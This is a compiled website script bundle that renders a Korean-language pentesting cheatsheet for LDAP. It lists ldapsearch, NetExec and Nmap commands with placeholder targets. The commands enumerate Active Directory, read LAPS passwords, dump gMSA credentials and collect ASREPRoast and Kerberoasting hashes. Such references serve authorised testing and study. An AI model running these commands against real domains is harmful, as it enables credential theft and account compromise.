"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[7023],{120:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>t,contentTitle:()=>r,default:()=>p,frontMatter:()=>c,metadata:()=>s,toc:()=>i});const s=JSON.parse('{"id":"Cheatsheet/services/ldap","title":"LDAP - 389/636","description":"\uae30\ubcf8 \uc815\ubcf4","source":"@site/docs/Cheatsheet/services/ldap.md","sourceDirName":"Cheatsheet/services","slug":"/Cheatsheet/services/ldap","permalink":"/my-docusaurus-page/Cheatsheet/services/ldap","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":13,"frontMatter":{"sidebar_position":13},"sidebar":"tutorialSidebar","previous":{"title":"Redis - 6379","permalink":"/my-docusaurus-page/Cheatsheet/services/redis"},"next":{"title":"WinRM - 5985/5986","permalink":"/my-docusaurus-page/Cheatsheet/services/winrm"}}');var d=a(4848),l=a(8453);const c={sidebar_position:13},r="LDAP - 389/636",t={},i=[{value:"\uae30\ubcf8 \uc815\ubcf4",id:"\uae30\ubcf8-\uc815\ubcf4",level:2},{value:"ldapsearch",id:"ldapsearch",level:2},{value:"NetExec LDAP",id:"netexec-ldap",level:2},{value:"\ub3c4\uba54\uc778 \uc5f4\uac70",id:"\ub3c4\uba54\uc778-\uc5f4\uac70",level:3},{value:"Domain SID \ucc3e\uae30",id:"domain-sid-\ucc3e\uae30",level:3},{value:"LDAP \ucffc\ub9ac",id:"ldap-\ucffc\ub9ac",level:3},{value:"DACL \uc5f4\uac70",id:"dacl-\uc5f4\uac70",level:3},{value:"\uc790\uaca9\uc99d\uba85 \ub364\ud504",id:"\uc790\uaca9\uc99d\uba85-\ub364\ud504",level:3},{value:"ASREPRoast",id:"asreproast",level:3},{value:"Kerberoasting",id:"kerberoasting",level:3},{value:"Delegation",id:"delegation",level:3},{value:"AD CS",id:"ad-cs",level:3},{value:"Nmap",id:"nmap",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function o(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.R)(),...e.components};return(0,d.jsxs)(d.Fragment,{children:[(0,d.jsx)(n.header,{children:(0,d.jsx)(n.h1,{id:"ldap---389636",children:"LDAP - 389/636"})}),"\n",(0,d.jsx)(n.h2,{id:"\uae30\ubcf8-\uc815\ubcf4",children:"\uae30\ubcf8 \uc815\ubcf4"}),"\n",(0,d.jsxs)(n.p,{children:[(0,d.jsx)(n.strong,{children:"\ud3ec\ud2b8"}),": 389 (LDAP), 636 (LDAPS), 3268 (Global Catalog)"]}),"\n",(0,d.jsx)(n.p,{children:"LDAP(Lightweight Directory Access Protocol)\ub294 \ub514\ub809\ud1a0\ub9ac \uc11c\ube44\uc2a4 \uc811\uadfc\uc744 \uc704\ud55c \ud504\ub85c\ud1a0\ucf5c\uc785\ub2c8\ub2e4."}),"\n",(0,d.jsx)(n.h2,{id:"ldapsearch",children:"ldapsearch"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:'# Naming Contexts \ud655\uc778\nldapsearch -x -h <RHOST> -s base namingcontexts\n\n# \uae30\ubcf8 \uc815\ubcf4 \uc870\ud68c\nldapsearch -H ldap://<RHOST> -x -s base -b \'\' "(objectClass=*)" "*" +\n\n# LDAPS (\ubcf4\uc548 LDAP)\nldapsearch -H ldaps://<RHOST>:636/ -x -s base -b \'\' "(objectClass=*)" "*" +\n\n# \ub3c4\uba54\uc778 \uc870\ud68c\nldapsearch -x -H ldap://<RHOST> -D \'\' -w \'\' -b "DC=<DOMAIN>,DC=local"\n\n# Description \ud544\ub4dc \uac80\uc0c9\nldapsearch -x -H ldap://<RHOST> -D \'\' -w \'\' -b "DC=<DOMAIN>,DC=local" | grep descr -A 3 -B 3\n\n# DN \ubaa9\ub85d\ub9cc \ucd94\ucd9c\nldapsearch -x -h <RHOST> -b "dc=<DOMAIN>,dc=local" "*" | awk \'/dn: / {print $2}\'\n\n# LAPS \ube44\ubc00\ubc88\ud638 \uc870\ud68c\nldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd\n\n# Info \ud544\ub4dc \uac80\uc0c9\nldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<DOMAIN>,DC=local" | grep info\n'})}),"\n",(0,d.jsx)(n.h2,{id:"netexec-ldap",children:"NetExec LDAP"}),"\n",(0,d.jsx)(n.h3,{id:"\ub3c4\uba54\uc778-\uc5f4\uac70",children:"\ub3c4\uba54\uc778 \uc5f4\uac70"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:"# \uc0ac\uc6a9\uc790 \uc5f4\uac70\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>\n\n# \ud65c\uc131 \uc0ac\uc6a9\uc790\ub9cc\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users\n\n# \uadf8\ub8f9 \uc5f4\uac70\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups \"<GROUP>\"\n\n# Admin Count \ud655\uc778\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --admin-count\n\n# \ud2b9\uc815 \ucffc\ub9ac\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query \"(adminCount=1)\" \"sAMAccountName\"\n\n# \ubaa8\ub4c8\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M maq\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ldap-checker\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M whoami\n\n# BloodHound \ub370\uc774\ud130 \uc218\uc9d1\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound --dns-tcp --dns-server <RHOST> -c All\n"})}),"\n",(0,d.jsx)(n.h3,{id:"domain-sid-\ucc3e\uae30",children:"Domain SID \ucc3e\uae30"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:"netexec ldap <RHOST> -u '<USERNAME>' -k --get-sid\n"})}),"\n",(0,d.jsx)(n.h3,{id:"ldap-\ucffc\ub9ac",children:"LDAP \ucffc\ub9ac"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:"# Administrator \uacc4\uc815 \uc870\ud68c\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query \"(sAMAccountName=Administrator)\" \"\"\n\n# \ud2b9\uc815 \uc18d\uc131 \uc870\ud68c\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query \"(sAMAccountName=Administrator)\" \"sAMAccountName objectClass pwdLastSet\"\n"})}),"\n",(0,d.jsx)(n.h3,{id:"dacl-\uc5f4\uac70",children:"DACL \uc5f4\uac70"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:'# \uae30\ubcf8 \uc77d\uae30\nnetexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read\n\n# \ud2b9\uc815 Principal\nnetexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=<USERNAME>\n\n# DCSync \uad8c\ud55c \ud655\uc778\nnetexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET_DN="DC=<DOMAIN>,DC=<DOMAIN>" ACTION=read RIGHTS=DCSync\n\n# Denied ACE \ud655\uc778\nnetexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied\n\n# \ubc31\uc5c5\nnetexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=../../<FILE> ACTION=backup\n'})}),"\n",(0,d.jsx)(n.h3,{id:"\uc790\uaca9\uc99d\uba85-\ub364\ud504",children:"\uc790\uaca9\uc99d\uba85 \ub364\ud504"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:"# GMSA\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k\n\n# GMSA ID \ubcc0\ud658\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>\n\n# GMSA LSA \ubcf5\ud638\ud654\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>\n"})}),"\n",(0,d.jsx)(n.h3,{id:"asreproast",children:"ASREPRoast"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:"# \uae30\ubcf8\nnetexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast\n\n# \uc790\uaca9\uc99d\uba85 \uc0ac\uc6a9\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast\n\n# KDC \uc9c0\uc815\nnetexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast --kdcHost <DOMAIN>\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast --kdcHost <DOMAIN>\n"})}),"\n",(0,d.jsx)(n.h3,{id:"kerberoasting",children:"Kerberoasting"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:"netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting\n"})}),"\n",(0,d.jsx)(n.h3,{id:"delegation",children:"Delegation"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:"# \uc704\uc784 \ucc3e\uae30\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation\n\n# Unconstrained Delegation\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --trusted-for-delegation\n"})}),"\n",(0,d.jsx)(n.h3,{id:"ad-cs",children:"AD CS"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:"# ADCS \uc5f4\uac70\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs\nnetexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs -o SERVER=<RHOST>\n"})}),"\n",(0,d.jsx)(n.h2,{id:"nmap",children:"Nmap"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-bash",children:"# LDAP \ubc84\uc804 \ud655\uc778\nsudo nmap -p389,636 -sV <RHOST>\n\n# LDAP \uc815\ubcf4 \uc218\uc9d1\nsudo nmap -p389 --script ldap-rootdse <RHOST>\n\n# LDAP \uac80\uc0c9\nsudo nmap -p389 --script ldap-search <RHOST>\n"})}),"\n",(0,d.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\uc775\uba85 \ubc14\uc778\ub529 \ud655\uc778"}),"\n",(0,d.jsx)(n.li,{children:"Null \uc790\uaca9\uc99d\uba85 \uc2dc\ub3c4"}),"\n",(0,d.jsx)(n.li,{children:"ASREPRoast, Kerberoasting \uacf5\uaca9"}),"\n",(0,d.jsx)(n.li,{children:"LAPS \ube44\ubc00\ubc88\ud638 \ud655\uc778"}),"\n",(0,d.jsx)(n.li,{children:"BloodHound \ub370\uc774\ud130 \uc218\uc9d1"}),"\n",(0,d.jsx)(n.li,{children:"ADCS \ucde8\uc57d\uc810 \ud655\uc778"}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,d.jsx)(n,{...e,children:(0,d.jsx)(o,{...e})}):o(e)}},8453:(e,n,a)=>{a.d(n,{R:()=>c,x:()=>r});var s=a(6540);const d={},l=s.createContext(d);function c(e){const n=s.useContext(l);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(d):e.components||d:c(e.components),s.createElement(l.Provider,{value:n},e.children)}}}]);